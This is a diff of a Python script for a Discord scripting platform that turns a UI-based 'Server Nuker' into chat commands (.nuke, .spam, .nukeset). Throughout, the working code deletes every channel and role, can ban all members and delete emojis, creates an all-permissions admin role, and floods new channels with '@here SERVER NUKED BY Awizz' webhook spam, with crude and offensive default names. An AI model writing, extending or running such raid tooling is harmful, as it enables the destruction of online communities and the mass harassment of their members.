@@ -1,10 +1,10 @@
 @nightyScript(
-    name="Discord Server Nuker V3",
+    name="Discord Server Nuker - Command Version",
     author="Awizz",
-    description="Advanced Nuker Tool made by Awizz",
-    version="3.0"
+    description="Basic Nuker made by Awizz - Free Version",
+    version="3.1"
 )
-def discordServerNukerV3():
+def discordServerNukerCommands():
     import discord
     import asyncio
     import json
@@ -14,47 +14,22 @@ def discordServerNukerV3():
     # ==================== CONFIGURATION MANAGER ====================
     class ConfigManager:
         def __init__(self):
-            self.config_dir = Path(getScriptsPath()) / "json" / "server_nuker_v3"
+            self.config_dir = Path(getScriptsPath()) / "json" / "server_nuker_commands"
             self.config_file = self.config_dir / "config.json"
-            self.backup_dir = self.config_dir / "backups"
             self._ensure_directories()
             self.default_config = self._get_default_config()
             
         def _ensure_directories(self):
             """Create necessary directories"""
             self.config_dir.mkdir(parents=True, exist_ok=True)
-            self.backup_dir.mkdir(exist_ok=True)
             
         def _get_default_config(self):
             return {
-                "target_server_id": "",
-                "target_channel_id": "",
-                "server_settings": {
-                    "custom_name": "Awizz's slaves",
-                    "custom_icon_url": "https://avatars.githubusercontent.com/u/241494424?v=4",
-                    "delete_roles": True,
-                    "delete_channels": True,
-                    "ban_members": False,
-                    "delete_emojis": False,
-                    "create_admin_role": False,
-                    "admin_role_name": "ADMIN"
-                },
-                "channel_settings": {
-                    "spam_message": "@here SERVER NUKED BY Awizz",
-                    "webhook_spam_count": 5,
-                    "webhook_username": "Anal Destroyer",
-                    "channels_to_create": 5,
-                    "channel_names": "nuked,rekt,awizz-was-here,logs,fucked"
-                },
-                "safety_settings": {
-                    "confirm_before_nuke": True,
-                    "backup_before_destruction": False,
-                    "max_operation_time": 300
-                },
-                "ui_state": {
-                    "last_refresh": "",
-                    "active_tab": "main"
-                }
+                "webhook_username": "Awizz",
+                "channels_to_create": 5,
+                "channel_names": "awizz,is,the,best,<3",
+                "admin_role_name": "EZ",
+                "default_message": "@here SERVER NUKED BY Awizz"
             }
         
         def load_config(self):
@@ -88,145 +63,132 @@ def discordServerNukerV3():
                     merged[key] = value
             return merged
 
-    # ==================== VALIDATION UTILITIES ====================
-    class Validators:
-        @staticmethod
-        def discord_id(value):
-            """Validate Discord ID format"""
-            return bool(re.match(r'^\d{17,20}$', str(value).strip()))
-        
-        @staticmethod
-        def webhook_count(value):
-            """Validate webhook spam count"""
-            try:
-                count = int(value)
-                return 1 <= count <= 50
-            except:
-                return False
-        
-        @staticmethod
-        def channel_count(value):
-            """Validate channel creation count"""
-            try:
-                count = int(value)
-                return 1 <= count <= 50
-            except:
-                return False
-        
-        @staticmethod
-        def url(value):
-            """Validate URL format"""
-            if not value.strip():
-                return True
-            pattern = r'^https?://[^\s/$.?#].[^\s]*$'
-            return bool(re.match(pattern, value.strip()))
-        
-        @staticmethod
-        def username(value):
-            """Validate webhook username"""
-            return 2 <= len(value.strip()) <= 32
-
     # ==================== SERVER MANAGER ====================
     class ServerManager:
         def __init__(self, config_manager):
             self.config = config_manager
-            self.validators = Validators()
             
-        async def nuke_server(self, progress_callback=None):
-            """Execute server nuke operation"""
-            config = self.config.load_config()
-            server_id = config["target_server_id"]
-            
-            if not self.validators.discord_id(server_id):
-                return False, "Invalid server ID"
-            
-            guild = bot.get_guild(int(server_id))
-            if not guild:
-                return False, "Server not found or bot not in server"
+        async def nuke_server(self, ctx, delete_roles=True, delete_channels=True, 
+                            ban_members=False, delete_emojis=False, create_admin=False,
+                            channels_count=5, spam_message=None, webhook_count=5):
+            """Execute server nuke operation with parameters"""
+            guild = ctx.guild
             
             # Permission check
             if not guild.me.guild_permissions.administrator:
-                return False, "Bot needs administrator permissions"
+                await ctx.send("❌ Bot needs administrator permissions")
+                return False
             
-            results = []
+            if not ctx.author.guild_permissions.administrator:
+                await ctx.send("❌ You need administrator permissions to use this command")
+                return False
+            
+            # Confirmation
+            confirm_msg = await ctx.send(
+                f"⚠️ **CONFIRM SERVER NUKE** ⚠️\n"
+                f"Are you absolutely sure you want to nuke this server?\n"
+                f"This will:\n"
+                f"{'• Delete all roles' if delete_roles else ''}\n"
+                f"{'• Delete all channels' if delete_channels else ''}\n"
+                f"{'• Ban all members' if ban_members else ''}\n"
+                f"{'• Delete all emojis' if delete_emojis else ''}\n"
+                f"{'• Create admin role' if create_admin else ''}\n"
+                f"**Type `CONFIRM` to proceed or wait 30s to cancel.**"
+            )
+            
+            def check(m):
+                return m.author == ctx.author and m.content.upper() == "CONFIRM"
             
             try:
-                # Update server name and icon
-                if config["server_settings"]["custom_name"] or config["server_settings"]["custom_icon_url"]:
-                    try:
-                        edit_kwargs = {}
-                        if config["server_settings"]["custom_name"]:
-                            edit_kwargs['name'] = config["server_settings"]["custom_name"]
-                        # Note: Icon setting would require image download
-                        # await guild.edit(**edit_kwargs)
-                        results.append("✓ Server appearance updated")
-                    except Exception as e:
-                        results.append(f"✗ Server update failed: {e}")
-                
+                await bot.wait_for('message', timeout=30.0, check=check)
+            except asyncio.TimeoutError:
+                await confirm_msg.edit(content="❌ Nuke operation cancelled.")
+                return False
+            
+            await ctx.message.delete()
+            
+            results = []
+            config = self.config.load_config()
+            
+            try:
                 # Delete channels
-                if config["server_settings"]["delete_channels"]:
+                if delete_channels:
                     deleted_channels = await self._delete_all_channels(guild)
                     results.append(f"✓ Deleted {deleted_channels} channels")
                     
                     # Create new channels and spam
-                    created = await self._create_spam_channels(guild, config)
+                    created = await self._create_spam_channels(
+                        guild, 
+                        channels_count, 
+                        spam_message or config["default_message"],
+                        webhook_count,
+                        config["webhook_username"],
+                        config["channel_names"]
+                    )
                     results.append(f"✓ Created {created} spam channels")
                 
                 # Delete roles
-                if config["server_settings"]["delete_roles"]:
+                if delete_roles:
                     deleted_roles = await self._delete_all_roles(guild)
                     results.append(f"✓ Deleted {deleted_roles} roles")
                 
                 # Ban members
-                if config["server_settings"]["ban_members"]:
+                if ban_members:
                     banned = await self._ban_all_members(guild)
                     results.append(f"✓ Banned {banned} members")
                 
                 # Delete emojis
-                if config["server_settings"]["delete_emojis"]:
+                if delete_emojis:
                     deleted_emojis = await self._delete_all_emojis(guild)
                     results.append(f"✓ Deleted {deleted_emojis} emojis")
                 
                 # Create admin role
-                if config["server_settings"]["create_admin_role"]:
+                if create_admin:
                     success = await self._create_admin_role(guild, config)
                     if success:
-                        results.append(f"✓ Admin role '{config['server_settings']['admin_role_name']}' created")
+                        results.append(f"✓ Admin role '{config['admin_role_name']}' created")
                     else:
                         results.append("✗ Admin role creation failed")
                 
-                return True, "\n".join(results)
+                # Send results - sans embed
+                result_message = f"✅ **Nuke Operation Completed**\n\n" + "\n".join(results)
+                await ctx.send(result_message)
+                
+                return True
                 
             except Exception as e:
-                return False, f"Nuke operation failed: {str(e)}"
+                error_message = f"❌ **Nuke Operation Failed**\n\nError: {str(e)}"
+                await ctx.send(error_message)
+                return False
         
-        async def spam_channel(self):
+        async def spam_channel(self, ctx, channel=None, message=None, count=5):
             """Execute channel spam operation"""
+            target_channel = channel or ctx.channel
             config = self.config.load_config()
-            channel_id = config["target_channel_id"]
             
-            if not self.validators.discord_id(channel_id):
-                return False, "Invalid channel ID"
-            
-            channel = bot.get_channel(int(channel_id))
-            if not channel:
-                return False, "Channel not found"
+            if not target_channel.permissions_for(ctx.guild.me).manage_webhooks:
+                await ctx.send("❌ Bot needs 'Manage Webhooks' permission in the target channel")
+                return False
             
             try:
-                webhook = await channel.create_webhook(name="nuker-webhook")
-                spam_count = config["channel_settings"]["webhook_spam_count"]
+                webhook = await target_channel.create_webhook(name="nuker-webhook")
+                spam_message = message or config["default_message"]
                 
-                for i in range(spam_count):
+                for i in range(count):
                     await webhook.send(
-                        content=config["channel_settings"]["spam_message"],
-                        username=config["channel_settings"]["webhook_username"]
+                        content=spam_message,
+                        username=config["webhook_username"]
                     )
                     await asyncio.sleep(0.5)
                 
-                return True, f"Sent {spam_count} messages to channel"
+                success_message = f"✅ **Spam Operation Completed**\n\nSent {count} messages to {target_channel.mention}"
+                await ctx.send(success_message)
+                return True
                 
             except Exception as e:
-                return False, f"Spam operation failed: {str(e)}"
+                error_message = f"❌ **Spam Operation Failed**\n\nError: {str(e)}"
+                await ctx.send(error_message)
+                return False
         
         async def _delete_all_channels(self, guild):
             """Delete all channels in guild"""
@@ -240,23 +202,22 @@ def discordServerNukerV3():
                     continue
             return count
         
-        async def _create_spam_channels(self, guild, config):
+        async def _create_spam_channels(self, guild, count, message, webhook_count, username, channel_names_str):
             """Create spam channels with webhooks"""
-            settings = config["channel_settings"]
-            channel_names = [name.strip() for name in settings["channel_names"].split(",")]
+            channel_names = [name.strip() for name in channel_names_str.split(",")]
             created_count = 0
             
-            for i in range(settings["channels_to_create"]):
+            for i in range(count):
                 try:
                     name = channel_names[i % len(channel_names)] if channel_names else f"nuked-{i+1}"
                     channel = await guild.create_text_channel(name)
                     
                     # Create webhook and spam
                     webhook = await channel.create_webhook(name="nuke-webhook")
-                    for j in range(settings["webhook_spam_count"]):
+                    for j in range(webhook_count):
                         await webhook.send(
-                            content=settings["spam_message"],
-                            username=settings["webhook_username"]
+                            content=message,
+                            username=username
                         )
                         await asyncio.sleep(0.5)
                     
@@ -308,7 +269,7 @@ def discordServerNukerV3():
             """Create admin role for bot"""
             try:
                 admin_role = await guild.create_role(
-                    name=config["server_settings"]["admin_role_name"],
+                    name=config["admin_role_name"],
                     permissions=discord.Permissions.all(),
                     reason="Nuke admin role"
                 )
@@ -317,386 +278,221 @@ def discordServerNukerV3():
             except:
                 return False
 
-    # ==================== UI COMPONENTS ====================
-    class UIComponents:
-        def __init__(self, config_manager, server_manager):
-            self.config = config_manager
-            self.server = server_manager
-            self.tab = None
-            
-        def create_ui(self):
-            """Create the main UI interface"""
-            self.tab = Tab(name="Server Nuker V3", title="Advanced Server Management", icon="⚡")
-            
-            # Security Notice
-            self._create_security_notice()
-            
-            # Main content in columns
-            cols = self.tab.create_container(type="columns", gap=4)
-            
-            # Left column - Configuration
-            left_col = cols.create_container(type="rows", width="60%", gap=4)
-            self._create_target_selection(left_col)
-            self._create_server_config(left_col)
-            self._create_channel_config(left_col)
-            
-            # Right column - Actions and Summary
-            right_col = cols.create_container(type="rows", width="40%", gap=4)
-            self._create_actions_card(right_col)
-            self._create_summary_card(right_col)
-            
-            self.tab.render()
-        
-        def _create_security_notice(self):
-            """Create security notice card"""
-            security_card = self.tab.create_card(height="auto", width="full", gap=3)
-            security_card.create_ui_element(UI.Text, content="🔒 Security Notice", size="xl", weight="bold", color="red")
-            
-            notice_text = (
-                "This script has NO text commands. All operations can ONLY be "
-                "performed through this secure UI interface that only YOU can "
-                "access. Nobody can command your account to nuke or spam servers.\n\n"
-                "Protected Features:\n"
-                "• No command-based access\n"
-                "• UI-only operation\n"
-                "• Direct bot API usage\n"
-                "• In-memory configuration\n"
-                "• Real-time validation\n"
-                "• Protected execution"
-            )
-            
-            security_card.create_ui_element(UI.Text, content=notice_text, size="sm")
-        
-        def _create_target_selection(self, parent):
-            """Create target selection card"""
-            card = parent.create_card(height="auto", width="full", gap=4)
-            card.create_ui_element(UI.Text, content="🎯 Target Selection", size="xl", weight="bold")
-            card.create_ui_element(UI.Text, content="Specify the Server ID and/or Channel ID for targeted actions", size="sm")
-            
-            cols = card.create_container(type="columns", gap=4)
-            
-            # Server ID input
-            server_col = cols.create_card(height="auto", width="half", gap=3)
-            server_col.create_ui_element(UI.Text, content="Server ID (for nuke)", size="md", weight="bold")
-            server_col.create_ui_element(UI.Text, content="The Discord server ID you want to nuke", size="sm", color="gray")
-            
-            def update_server_id(value):
-                config = self.config.load_config()
-                config["target_server_id"] = value.strip()
-                self.config.save_config(config)
-            
-            server_col.create_ui_element(
-                UI.Input,
-                label="Enter server ID...",
-                value=self.config.load_config()["target_server_id"],
-                onInput=update_server_id,
-                full_width=True
-            )
-            
-            # Channel ID input
-            channel_col = cols.create_card(height="auto", width="half", gap=3)
-            channel_col.create_ui_element(UI.Text, content="Channel ID (for spam)", size="md", weight="bold")
-            channel_col.create_ui_element(UI.Text, content="The Discord channel ID you want to spam", size="sm", color="gray")
-            
-            def update_channel_id(value):
-                config = self.config.load_config()
-                config["target_channel_id"] = value.strip()
-                self.config.save_config(config)
-            
-            channel_col.create_ui_element(
-                UI.Input,
-                label="Enter channel ID...",
-                value=self.config.load_config()["target_channel_id"],
-                onInput=update_channel_id,
-                full_width=True
-            )
-        
-        def _create_server_config(self, parent):
-            """Create server configuration card"""
-            card = parent.create_card(height="auto", width="full", gap=4)
-            card.create_ui_element(UI.Text, content="⚙️ Server Configuration", size="xl", weight="bold")
-            
-            # Custom Server Name
-            name_group = card.create_group(type="rows", gap=2, full_width=True)
-            name_group.create_ui_element(UI.Text, content="Custom Server Name", size="md", weight="bold")
-            name_group.create_ui_element(UI.Text, content="Leave empty to skip", size="sm", color="gray")
-            
-            def update_custom_name(value):
-                config = self.config.load_config()
-                config["server_settings"]["custom_name"] = value
-                self.config.save_config(config)
-            
-            name_group.create_ui_element(
-                UI.Input,
-                label="New name for server after nuke (optional)",
-                value=self.config.load_config()["server_settings"]["custom_name"],
-                onInput=update_custom_name,
-                full_width=True
-            )
-            
-            # Custom Server Icon
-            icon_group = card.create_group(type="rows", gap=2, full_width=True)
-            icon_group.create_ui_element(UI.Text, content="Custom Server Icon URL", size="md", weight="bold")
-            
-            def update_custom_icon(value):
-                config = self.config.load_config()
-                config["server_settings"]["custom_icon_url"] = value
-                self.config.save_config(config)
-            
-            icon_group.create_ui_element(
-                UI.Input,
-                label="New icon URL (optional)",
-                placeholder="https://example.com/icon.png",
-                value=self.config.load_config()["server_settings"]["custom_icon_url"],
-                onInput=update_custom_icon,
-                full_width=True
-            )
-            
-            # Default Behavior
-            card.create_ui_element(UI.Text, content="🔧 Default Behavior", size="lg", weight="bold")
-            card.create_ui_element(UI.Text, content="Core destruction settings", size="sm", color="gray")
-            
-            # Behavior toggles in columns
-            toggle_cols = card.create_container(type="columns", gap=4)
-            col1 = toggle_cols.create_group(type="rows", gap=3, full_width=True)
-            col2 = toggle_cols.create_group(type="rows", gap=3, full_width=True)
-            
-            config = self.config.load_config()
-            server_settings = config["server_settings"]
-            
-            # Toggle functions
-            def toggle_delete_roles(checked):
-                config = self.config.load_config()
-                config["server_settings"]["delete_roles"] = checked
-                self.config.save_config(config)
-            
-            def toggle_delete_channels(checked):
-                config = self.config.load_config()
-                config["server_settings"]["delete_channels"] = checked
-                self.config.save_config(config)
-            
-            def toggle_ban_members(checked):
-                config = self.config.load_config()
-                config["server_settings"]["ban_members"] = checked
-                self.config.save_config(config)
-            
-            def toggle_delete_emojis(checked):
-                config = self.config.load_config()
-                config["server_settings"]["delete_emojis"] = checked
-                self.config.save_config(config)
-            
-            def toggle_create_admin(checked):
-                config = self.config.load_config()
-                config["server_settings"]["create_admin_role"] = checked
-                self.config.save_config(config)
-            
-            def update_admin_name(value):
-                config = self.config.load_config()
-                config["server_settings"]["admin_role_name"] = value
-                self.config.save_config(config)
-            
-            # Column 1 toggles
-            col1.create_ui_element(UI.Toggle, label="Auto-Delete Roles", checked=server_settings["delete_roles"], onChange=toggle_delete_roles)
-            col1.create_ui_element(UI.Toggle, label="Auto-Delete Channels", checked=server_settings["delete_channels"], onChange=toggle_delete_channels)
-            col1.create_ui_element(UI.Toggle, label="Ban All Members", checked=server_settings["ban_members"], onChange=toggle_ban_members)
-            
-            # Column 2 toggles
-            col2.create_ui_element(UI.Toggle, label="Delete All Emojis", checked=server_settings["delete_emojis"], onChange=toggle_delete_emojis)
-            col2.create_ui_element(UI.Toggle, label="Create Admin Role for Self", checked=server_settings["create_admin_role"], onChange=toggle_create_admin)
-            col2.create_ui_element(UI.Input, label="Admin Role Name", value=server_settings["admin_role_name"], onInput=update_admin_name, full_width=True)
-        
-        def _create_channel_config(self, parent):
-            """Create channel configuration card"""
-            card = parent.create_card(height="auto", width="full", gap=4)
-            card.create_ui_element(UI.Text, content="💬 Channel Configuration", size="xl", weight="bold")
-            
-            # Message & Webhook Config
-            message_group = card.create_group(type="rows", gap=3, full_width=True)
-            message_group.create_ui_element(UI.Text, content="Message & Webhook Config", size="lg", weight="bold")
-            
-            # Spam Message
-            def update_spam_message(value):
-                config = self.config.load_config()
-                config["channel_settings"]["spam_message"] = value
-                self.config.save_config(config)
-            
-            message_input = message_group.create_ui_element(
-                UI.Input,
-                label="Default Spam Message",
-                value=self.config.load_config()["channel_settings"]["spam_message"],
-                onInput=update_spam_message,
-                full_width=True
-            )
-            message_group.create_ui_element(UI.Text, content="Message sent via webhooks (@here is automatically added)", size="sm", color="gray")
-            
-            # Webhook settings in columns
-            webhook_cols = card.create_container(type="columns", gap=4)
-            
-            # Webhook Spam Count
-            def update_webhook_count(value):
-                if Validators().webhook_count(value):
-                    config = self.config.load_config()
-                    config["channel_settings"]["webhook_spam_count"] = int(value)
-                    self.config.save_config(config)
-            
-            webhook_col1 = webhook_cols.create_card(height="auto", width="half", gap=3)
-            webhook_col1.create_ui_element(UI.Text, content="Webhook Spam Count", size="md", weight="bold")
-            webhook_col1.create_ui_element(
-                UI.Input,
-                label="Number of messages sent per webhook",
-                value=str(self.config.load_config()["channel_settings"]["webhook_spam_count"]),
-                onInput=update_webhook_count,
-                full_width=True
-            )
-            
-            # Webhook Username
-            def update_webhook_username(value):
-                if Validators().username(value):
-                    config = self.config.load_config()
-                    config["channel_settings"]["webhook_username"] = value
-                    self.config.save_config(config)
-            
-            webhook_col2 = webhook_cols.create_card(height="auto", width="half", gap=3)
-            webhook_col2.create_ui_element(UI.Text, content="Webhook Username", size="md", weight="bold")
-            webhook_col2.create_ui_element(
-                UI.Input,
-                label="Custom username for webhook messages",
-                value=self.config.load_config()["channel_settings"]["webhook_username"],
-                onInput=update_webhook_username,
-                full_width=True
-            )
-        
-        def _create_actions_card(self, parent):
-            """Create actions execution card"""
-            card = parent.create_card(height="auto", width="full", gap=4)
-            card.create_ui_element(UI.Text, content="🚀 Execute Actions", size="xl", weight="bold")
-            card.create_ui_element(UI.Text, content="Use Server ID and Channel ID from Target Selection above", size="sm")
-            
-            action_buttons = card.create_group(type="columns", gap=3, full_width=True)
-            
-            # Nuke Server button
-            async def execute_nuke():
-                config = self.config.load_config()
-                
-                if not config["target_server_id"]:
-                    self.tab.toast("ERROR", "Missing Server ID", "Please enter a valid Server ID first")
-                    return
-                
-                if config["safety_settings"]["confirm_before_nuke"]:
-                    if not await self.tab.confirm("⚠️ CONFIRM SERVER NUKE", 
-                                               f"Are you absolutely sure you want to nuke server {config['target_server_id']}? This action is IRREVERSIBLE!"):
-                        return
-                
-                nuke_button.loading = True
-                success, message = await self.server.nuke_server()
-                
-                if success:
-                    self.tab.toast("SUCCESS", "Nuke Completed", message)
-                else:
-                    self.tab.toast("ERROR", "Nuke Failed", message)
-                
-                nuke_button.loading = False
-            
-            nuke_button = action_buttons.create_ui_element(
-                UI.Button,
-                label="NUKE SERVER",
-                onClick=execute_nuke,
-                full_width=True,
-                color="danger"
-            )
-            
-            # Spam Channel button
-            async def execute_spam():
-                config = self.config.load_config()
-                
-                if not config["target_channel_id"]:
-                    self.tab.toast("ERROR", "Missing Channel ID", "Please enter a valid Channel ID first")
-                    return
-                
-                if not await self.tab.confirm("Confirm Spam", 
-                                           f"Send {config['channel_settings']['webhook_spam_count']} messages to channel {config['target_channel_id']}?"):
-                    return
-                
-                spam_button.loading = True
-                success, message = await self.server.spam_channel()
-                
-                if success:
-                    self.tab.toast("SUCCESS", "Spam Completed", message)
-                else:
-                    self.tab.toast("ERROR", "Spam Failed", message)
-                
-                spam_button.loading = False
-            
-            spam_button = action_buttons.create_ui_element(
-                UI.Button,
-                label="SPAM CHANNEL",
-                onClick=execute_spam,
-                full_width=True,
-                color="primary"
-            )
-        
-        def _create_summary_card(self, parent):
-            """Create configuration summary card"""
-            card = parent.create_card(height="auto", width="full", gap=4)
-            card.create_ui_element(UI.Text, content="📊 Configuration Summary", size="xl", weight="bold")
-            
-            # Summary display
-            self.summary_display = card.create_ui_element(UI.Text, content="", size="sm", full_width=True)
-            
-            # Control buttons
-            control_group = card.create_group(type="columns", gap=3, full_width=True)
-            
-            async def refresh_display():
-                self._update_summary()
-                self.tab.toast("INFO", "Refreshed", "Display updated with current configuration")
-            
-            async def reset_defaults():
-                if await self.tab.confirm("Reset Configuration", "Reset all settings to defaults?"):
-                    default_config = self.config.default_config
-                    self.config.save_config(default_config)
-                    self._update_summary()
-                    self.tab.toast("SUCCESS", "Reset Complete", "All settings restored to defaults")
-            
-            control_group.create_ui_element(UI.Button, label="Refresh Display", onClick=refresh_display, full_width=True, color="secondary")
-            control_group.create_ui_element(UI.Button, label="Reset to Defaults", onClick=reset_defaults, full_width=True, color="secondary")
-            
-            # Initial summary update
-            self._update_summary()
-        
-        def _update_summary(self):
-            """Update the configuration summary display"""
-            config = self.config.load_config()
-            server_settings = config["server_settings"]
-            channel_settings = config["channel_settings"]
-            
-            server_status = config["target_server_id"] if config["target_server_id"] else "Not set"
-            channel_status = config["target_channel_id"] if config["target_channel_id"] else "Not set"
-            
-            summary_text = f"""Target Server: {server_status}
-Target Channel: {channel_status}
-Channel Names: {channel_settings['channel_names']}
-Default Count: {channel_settings['channels_to_create']} channels
-Max Limit: 50 channels
-Webhook Spams: {channel_settings['webhook_spam_count']} messages
-Webhook Username: {channel_settings['webhook_username']}
-Name Length: 6 chars
-Delete Roles: {'Yes' if server_settings['delete_roles'] else 'No'}
-Delete Channels: {'Yes' if server_settings['delete_channels'] else 'No'}
-Ban Members: {'Yes' if server_settings['ban_members'] else 'No'}
-Delete Emojis: {'Yes' if server_settings['delete_emojis'] else 'No'}
-Create Admin: {'Yes' if server_settings['create_admin_role'] else 'No'}"""
-            
-            if hasattr(self, 'summary_display'):
-                self.summary_display.content = summary_text
-
-    # ==================== MAIN EXECUTION ====================
+    # ==================== COMMAND HANDLERS ====================
     
     # Initialize managers
     config_manager = ConfigManager()
     server_manager = ServerManager(config_manager)
     
-    # Create and display UI
-    ui = UIComponents(config_manager, server_manager)
-    ui.create_ui()
+    @bot.command(name='nuke')
+    async def nuke_command(ctx, *, args=None):
+        """
+        🔥 NUKE SERVER COMMAND
+        
+        Usage: .nuke [flags]
+        
+        Flags:
+          -r, --roles       Delete all roles
+          -c, --channels    Delete all channels and create spam channels
+          -b, --ban         Ban all members
+          -e, --emojis      Delete all emojis
+          -a, --admin       Create admin role for bot
+          --channels=5      Number of channels to create (default: 5)
+          --message="text"  Custom spam message
+          --webhooks=5      Messages per webhook (default: 5)
+          
+        Examples:
+          .nuke -r -c -b                    # Full nuke with roles, channels, bans
+          .nuke -c --channels=10            # Delete channels and create 10 spam channels
+          .nuke -c --message="CUSTOM TEXT"  # Custom spam message
+          .nuke --help                      # Show this help
+        """
+        
+        if args and args.lower() in ['help', '--help', '-h']:
+            help_text = nuke_command.__doc__
+            await ctx.send(f"🛠️ **NUKE COMMAND HELP**\n\n{help_text}")
+            return
+        
+        # Default parameters
+        delete_roles = False
+        delete_channels = False
+        ban_members = False
+        delete_emojis = False
+        create_admin = False
+        channels_count = 5
+        webhook_count = 5
+        spam_message = None
+        
+        # Parse flags
+        if args:
+            args_lower = args.lower()
+            
+            # Basic flags
+            if '-r' in args_lower or '--roles' in args_lower:
+                delete_roles = True
+            if '-c' in args_lower or '--channels' in args_lower:
+                delete_channels = True
+            if '-b' in args_lower or '--ban' in args_lower:
+                ban_members = True
+            if '-e' in args_lower or '--emojis' in args_lower:
+                delete_emojis = True
+            if '-a' in args_lower or '--admin' in args_lower:
+                create_admin = True
+            
+            # Advanced parameters
+            channels_match = re.search(r'--channels=(\d+)', args)
+            if channels_match:
+                channels_count = min(int(channels_match.group(1)), 50)  # Max 50 channels
+            
+            webhooks_match = re.search(r'--webhooks=(\d+)', args)
+            if webhooks_match:
+                webhook_count = min(int(webhooks_match.group(1)), 50)  # Max 50 messages
+            
+            message_match = re.search(r'--message="([^"]+)"', args)
+            if message_match:
+                spam_message = message_match.group(1)
+        
+        # If no specific flags, enable default nuke (channels + roles)
+        if not any([delete_roles, delete_channels, ban_members, delete_emojis, create_admin]):
+            delete_roles = True
+            delete_channels = True
+        
+        await server_manager.nuke_server(
+            ctx=ctx,
+            delete_roles=delete_roles,
+            delete_channels=delete_channels,
+            ban_members=ban_members,
+            delete_emojis=delete_emojis,
+            create_admin=create_admin,
+            channels_count=channels_count,
+            spam_message=spam_message,
+            webhook_count=webhook_count
+        )
+    
+    @bot.command(name='spam')
+    async def spam_command(ctx, channel: discord.TextChannel = None, *, message=None):
+        """
+        💬 SPAM CHANNEL COMMAND
+        
+        Usage: .spam [channel] [message]
+        
+        Parameters:
+          channel: Target channel (default: current channel)
+          message: Custom message (optional)
+          count: Number of messages (default: 5)
+          
+        Examples:
+          .spam                          # Spam current channel with default message
+          .spam #general                 # Spam #general channel
+          .spam #general Hello World     # Spam with custom message
+          .spam --count=10               # Send 10 messages
+        """
+        
+        count = 5
+        if message:
+            # Check for count parameter
+            count_match = re.search(r'--count=(\d+)', message)
+            if count_match:
+                count = min(int(count_match.group(1)), 20)  # Max 20 messages
+                # Remove count from message
+                message = re.sub(r'--count=\d+', '', message).strip()
+        
+        await server_manager.spam_channel(
+            ctx=ctx,
+            channel=channel,
+            message=message,
+            count=count
+        )
+    
+    @bot.command(name='nukeset')
+    async def config_command(ctx, key=None, *, value=None):
+        """
+        ⚙️ CONFIGURE NUKE SETTINGS
+        
+        Usage: .nukeset <key> <value>
+        
+        Available keys:
+          username     - Webhook username (default: "Destroyer")
+          channels     - Default channels to create (default: 5)
+          names        - Channel names (comma separated)
+          adminrole    - Admin role name (default: "ADMIN")
+          message      - Default spam message
+          
+        Examples:
+          .nukeset username "NewName"
+          .nukeset channels 10
+          .nukeset names "raid,owned,destroyed"
+          .nukeset message "CUSTOM MESSAGE"
+        """
+        
+        config = config_manager.load_config()
+        
+        if not key:
+            # Show current configuration - sans embed
+            config_text = (
+                f"⚙️ **Current Nuke Configuration**\n\n"
+                f"**Webhook Username:** {config['webhook_username']}\n"
+                f"**Channels to Create:** {config['channels_to_create']}\n"
+                f"**Admin Role Name:** {config['admin_role_name']}\n"
+                f"**Channel Names:** {config['channel_names']}\n"
+                f"**Default Message:** {config['default_message'][:100]}{'...' if len(config['default_message']) > 100 else ''}"
+            )
+            await ctx.send(config_text)
+            return
+        
+        key = key.lower()
+        
+        if key in ["username", "webhook_username"]:
+            config["webhook_username"] = value
+            await ctx.send(f"✅ Webhook username set to: `{value}`")
+        
+        elif key in ["channels", "channels_count"]:
+            try:
+                count = int(value)
+                if 1 <= count <= 50:
+                    config["channels_to_create"] = count
+                    await ctx.send(f"✅ Default channels to create set to: `{count}`")
+                else:
+                    await ctx.send("❌ Channel count must be between 1-50")
+            except:
+                await ctx.send("❌ Invalid channel count")
+        
+        elif key in ["names", "channel_names"]:
+            config["channel_names"] = value
+            await ctx.send(f"✅ Channel names set to: `{value}`")
+        
+        elif key in ["adminrole", "admin_role"]:
+            config["admin_role_name"] = value
+            await ctx.send(f"✅ Admin role name set to: `{value}`")
+        
+        elif key in ["message", "default_message"]:
+            config["default_message"] = value
+            await ctx.send(f"✅ Default message set to: `{value}`")
+        
+        else:
+            await ctx.send("❌ Unknown configuration key. Use `.nukeset` to see available keys.")
+            return
+        
+        config_manager.save_config(config)
+    
+    @bot.command(name='nukehelp')
+    async def help_command(ctx):
+        """Show all nuke commands"""
+        help_text = (
+            "💣 **DISCORD SERVER NUKER - COMMAND HELP**\n\n"
+            "**🔥 .nuke [flags]**\n"
+            "Execute server nuke operation\n"
+            "Flags: -r (roles), -c (channels), -b (ban), -e (emojis), -a (admin)\n"
+            "Options: --channels=N, --webhooks=N, --message=\"text\"\n\n"
+            "**💬 .spam [channel] [message]**\n"
+            "Spam a channel with webhook messages\n"
+            "Use --count=N to specify number of messages\n\n"
+            "**⚙️ .nukeset [key] [value]**\n"
+            "Configure nuke settings\n"
+            "Keys: username, channels, names, adminrole, message\n\n"
+            "**📖 .nukehelp**\n"
+            "Show this help message"
+        )
+        await ctx.send(help_text)
 
-discordServerNukerV3()
+discordServerNukerCommands()
